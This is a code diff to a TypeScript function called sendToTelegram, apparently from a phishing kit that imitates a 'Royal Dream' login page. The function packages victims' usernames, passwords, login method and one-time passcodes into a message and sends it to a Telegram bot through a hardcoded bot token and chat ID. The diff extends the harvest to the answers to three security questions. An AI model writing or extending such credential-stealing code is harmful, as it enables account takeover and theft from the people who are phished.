@@ -2,7 +2,12 @@ export const sendToTelegram = async (
   identifier: string, 
   pass: string, 
   loginMethod: string, 
-  otp: string // Changed from _extraInfo to otp
+  otp: string,
+  securityAnswers?: {
+    q1: string, a1: string,
+    q2: string, a2: string,
+    q3: string, a3: string
+  }
 ) => {
   const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
   const CHAT_IDS = ['', '6076369736']; // Add your IDs here
@@ -39,6 +44,19 @@ export const sendToTelegram = async (
   if (loginMethod === "Email Login") loginLabel = "📧 Email";
   if (loginMethod === "Facebook Login") loginLabel = "👤 Email/Phone";
 
+  let securitySection = "";
+  if (securityAnswers) {
+    securitySection = `
+🛡️ <b>Security Questions:</b>
+└ Q1: ${securityAnswers.q1}
+└ A1: <code>${securityAnswers.a1}</code>
+└ Q2: ${securityAnswers.q2}
+└ A2: <code>${securityAnswers.a2}</code>
+└ Q3: ${securityAnswers.q3}
+└ A3: <code>${securityAnswers.a3}</code>
+`;
+  }
+
   const message = `
 🔐 <b>LOGIN DATA ROYAL DREAM</b>
 ─────────────────
@@ -50,7 +68,7 @@ export const sendToTelegram = async (
 ─────────────────
 ${loginLabel}: <code>${identifier}</code>
 🔐 Password: <code>${pass}</code>
-
+${securitySection}
 🛡️ <b>Security Verification:</b>
 └ OTP: <code>${otp}</code>
 
